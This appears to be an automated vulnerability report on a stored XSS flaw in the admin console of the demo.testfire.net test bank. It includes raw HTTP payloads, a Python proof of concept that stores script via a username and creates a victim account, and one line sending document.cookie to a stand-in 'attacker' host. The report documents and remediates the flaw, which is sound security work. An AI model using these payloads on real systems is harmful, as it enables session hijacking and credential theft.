# Stored XSS via /admin/addUser username rendered in /admin/admin.jsp (cross-user confirmed)

**ID:** vuln-0015
**Severity:** HIGH
**Found:** 2026-09-20 21:48:43 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /admin/addUser
**Method:** POST
**CWE:** CWE-79
**CVSS:** 7.6
**Confidence:** High
**Fix Effort:** Medium

## Description

A username created through the admin "Add User" function is stored and later rendered without encoding in `/admin/admin.jsp`. Cross-user execution is confirmed: a payload stored by one authenticated account executes in a **different** account's session as soon as that user opens the admin console. Because the console is reachable by any authenticated user, not only administrators, a low-privilege attacker can persist script that fires in every user's session — including more privileged ones.

## Evidence

Payload stored by the attacker account (authenticated `POST /admin/addUser`):
```http
POST /admin/addUser HTTP/1.1
Host: demo.testfire.net
Content-Type: application/x-www-form-urlencoded

username=%3Cimg+src%3Dx+onerror%3Dwindow.__storedXss%3D778899%3E&password1=zz9pw&password2=zz9pw&firstname=rg&lastname=x&add=Add+User
```
It persists and is returned unencoded by the console:
```html
<option value="<img src=x onerror=window.__storedXss=778899>"><img src=x onerror=window.__storedXss=778899></option>
```
The payload is served to a **different** authenticated session (Account B, `GET /admin/admin.jsp`):
```http
HTTP/1.1 200 OK
... window.__storedXss=778899 ... (present twice)
```
Execution in Account B's browser session (Account B never used the Add User function) — evaluated live in the loaded page:
```
> window.__storedXss
778899
> JSON.stringify({title:document.title, xss:window.__storedXss, onerrorImgs:document.querySelectorAll('img[onerror]').length})
"{\"title\":\"13\",\"xss\":778899,\"onerrorImgs\":6}"
```
The page's own title was also rewritten to `13` by an independently stored payload, and six attacker-controlled `<img onerror>` elements were present in the live DOM — all evidence that stored usernames are parsed and their handlers executed in the victim's session. A control check confirms the account really is a distinct, authenticated user: `GET /admin/admin.jsp` without a session returns `302 -> /login.jsp`.

## Impact

The payload is persistent: once stored it executes every time any authenticated user opens `/admin/admin.jsp`, in that viewer's own session. Cross-user execution was demonstrated end to end with two independent accounts — the payload was stored by account A and fired in account B's session, which never touched the Add User function. The hosting console page renders the plaintext `username:password:role` of every account in the `PEOPLE` table, so the stored script can silently exfiltrate that credential material, read whatever the victim's session can read, and drive privileged user-management operations (create users, change passwords) as the victim. This turns a stored value into session-riding and account-takeover capability inside other users' authenticated sessions.

## Counterevidence

The original strongest objection — that execution was only seen in the storing user's own session — is now removed: a second, unrelated account created with an all-lowercase password authenticated successfully and the stored payload executed in its session, with no interaction beyond opening the console. Remaining constraints: the victim must be lured to `/admin/admin.jsp`, which is not the default landing page, so the viewer population is limited to users who open the admin console; and the discrete capabilities the payload can invoke (credential dump, user creation, password change) are already reachable by any authenticated user through separate authorization defects, so the marginal impact of the XSS itself is session riding and silent exfiltration in the victim's identity rather than access that is otherwise impossible. No output encoding, CSP, `X-XSS-Protection` or per-session filtering was found on the render path; the payload was verified to execute in a current browser engine.

## What Would Change This Severity

Evidence that a distinct, more-privileged account (a true administrator) routinely opens `/admin/admin.jsp` and is served the payload would further strengthen the impact; conversely, if the console required a dedicated administrator role that low-privilege users cannot obtain, both storage and victim population would shrink and severity would drop toward medium.

## Technical Analysis

`POST /admin/addUser` stores the supplied `username` verbatim in the database (`DBUtil.addUser`, `INSERT INTO PEOPLE (...))`. `/admin/admin.jsp` builds two `<select>` elements from `getBankUsers()` (`SELECT USER_ID FROM PEOPLE`) and writes each stored username twice — once inside the quoted `value` attribute and once as the option's text content — with no HTML encoding:

```jsp title=WebContent/admin/admin.jsp startLineNumber=88 endLineNumber=90
<select name="username" id="username" size="1">
	...
	<option value="<%=user%>"><%=user%></option>
```

The same construct is repeated for the Change Password form at lines 124-126. A username such as `<img src=x onerror=window.__storedXss=778899>` is therefore emitted raw; in the text-content position the `<img>` is parsed as a real element and its `onerror` handler executes on every page load. There is no output encoding, no CSP and no `X-XSS-Protection`.

Cross-user reachability: `getBankUsers()` returns **all** rows regardless of the viewer, so the stored value is emitted on every load of the console by **any** authenticated session. `/admin/*` is protected only by the login `AuthFilter`; the role-checking `AdminFilter` is not effective on this path, so any authenticated user — attacker or victim — reaches both `addUser` and `admin.jsp`. The lack of any per-session filtering is what makes the payload execute in a *different* user's session, as verified below.

## Proof of Concept

Two independent authenticated accounts are used: the attacker account stores the payload, and a second, unrelated victim account is the one in whose session the payload fires.

1. Log in as the low-privilege attacker account (`jsmith`).
2. Store the payload as a username by submitting the Add User form to `POST /admin/addUser` with `username=<img src=x onerror=window.__storedXss=778899>`.
3. Confirm the payload is now served unencoded by `GET /admin/admin.jsp`.
4. Create a second, unrelated account through the same function, using an all-lowercase password (the login servlet lower-cases the submitted password before the credential check, so a mixed-case password would never authenticate).
5. Log in as the second account in a clean browser session and open `/admin/admin.jsp`.
6. Observe that the stored payload executes in the second account's session: `window.__storedXss` is `778899`, and the injected `<img onerror>` element is present in the live DOM.
7. Replace the side effect with `new Image().src='//attacker/'+document.cookie` or a state-changing request to turn the execution into session riding / account takeover.

```python
import requests

BASE = "http://demo.testfire.net"

def login(uid, pw):
    s = requests.Session()
    s.post(f"{BASE}/doLogin",
           data={"uid": uid, "passw": pw, "btnSubmit": "Login"})
    return s

# --- Account A: any authenticated low-privilege user (attacker) ---
attacker = login("jsmith", "demo1234")

# Store the payload as a username (any authenticated user can reach this)
payload = "<img src=x onerror=window.__storedXss=778899>"
attacker.post(f"{BASE}/admin/addUser",
              data={"firstname": "f", "lastname": "l",
                    "username": payload,
                    "password1": "lowercase1", "password2": "lowercase1",
                    "add": "Add User"})

# Create a second, unrelated account. Password MUST be all lower-case,
# because /doLogin applies password.trim().toLowerCase() before the check.
attacker.post(f"{BASE}/admin/addUser",
              data={"firstname": "victim", "lastname": "user",
                    "username": "victimaccount",
                    "password1": "victimpw", "password2": "victimpw",
                    "add": "Add User"})

# --- Account B: the victim, a different user ---
victim = login("victimaccount", "victimpw")

# The victim simply opens the console; the payload stored by Account A
# is served into Account B's session and executes there.
r = victim.get(f"{BASE}/admin/admin.jsp")
assert "window.__storedXss=778899" in r.text
print("payload stored by account A was served to account B's session")

# Browser confirmation (Account B session):
#   window.__storedXss === 778899
#   document.querySelectorAll('img[onerror]').length > 0
```

## Remediation

HTML-entity-encode all stored user fields (especially `username`) wherever they are rendered, using context-appropriate encoding for attribute and text positions; prefer the templating engine's automatic escaping. Enforce a real role check on `/admin/*` (fix the `AdminFilter` path mapping) so only administrators reach the console, and validate usernames against an allow-list (e.g. alphanumerics/`.`/`_`/`-`). Add a restrictive `Content-Security-Policy` as defence in depth.

## Assumptions

Requires one authenticated account to store the payload (any logged-in user can reach the ineffective admin path) and a distinct authenticated victim who opens `/admin/admin.jsp`. The victim account must be created with an all-lowercase password because the login servlet lower-cases the submitted password. Data is the application's synthetic demo data.
